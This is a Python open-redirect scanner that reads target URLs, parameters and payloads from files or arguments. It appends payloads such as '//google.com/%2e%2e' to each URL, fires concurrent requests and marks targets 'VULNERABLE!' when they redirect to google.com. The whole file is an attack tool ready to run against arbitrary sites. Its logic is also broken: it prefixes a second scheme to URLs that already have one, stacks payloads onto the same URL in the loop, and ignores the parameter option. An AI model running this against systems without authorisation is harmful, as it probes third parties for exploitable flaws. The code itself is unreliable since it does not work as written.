# inspired from bobrov script
# http://offsecbyautomation.com/Open-Redirection-Bobrov/

import os.path
import sys
import argparse
import requests
import concurrent.futures
from termcolor import colored

target = 'google.com'

parser = argparse.ArgumentParser()
parser.add_argument("-a","--param",help="params file or single param")
parser.add_argument("-u","--url",help="urls file or single urls")
parser.add_argument("-p","--payload",help="payloads file or single payload")
parser.add_argument("-s","--nossl",help="disable ssl", action="store_true")
parser.parse_args()
args = parser.parse_args()

if args.nossl:
    ssl = ''
else:
    ssl = 's'

if args.url:
    f_url = args.url
    if os.path.isfile(f_url):
        with open(f_url) as f:
            t_url = []
            temp = f.read().splitlines()
            for u in temp:
                if not u.startswith('http'):
                    u = 'http' + ssl + '://' + u
                t_url.append( u )
    else:
        t_url = [f_url]

if args.param:
    f_param = args.param
    if os.path.isfile(f_param):
        f = open( f_param, 'r')
        t_param = f.readlines()
        f.close()
    else:
        t_param = [f_param]
else:
    t_param = []

if args.payload:
    f_payload = args.payload
    if os.path.isfile(f_payload):
        f = open( f_payload, 'r')
        t_payload = f.readlines()
        f.close()
    else:
        t_payload = [f_payload]
else:
    t_payload = ["//google.com/%2e%2e"]

def testOR( index ):
    url = t_url[index].strip()
    for payload in t_payload:
        url = 'http' + ssl + '://' + url + payload
        #sys.stdout.write( url )
        sys.stdout.write(url)
        try:
            r = requests.get( url, allow_redirects=False, timeout=5 )
        except requests.exceptions.RequestException as e:
            #print e
            sys.stdout.write( "\n" )
            continue
        if "Location" in r.headers and (r.headers["Location"].startswith('http://'+target) or r.headers["Location"].startswith('https://'+target)):
            sys.stdout.write( colored(" VULNERABLE!","red") )
        sys.stdout.write( "\n" )

if __name__ == "__main__":
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        for index in range(0,len(t_url)):
            executor.submit( testOR, index )


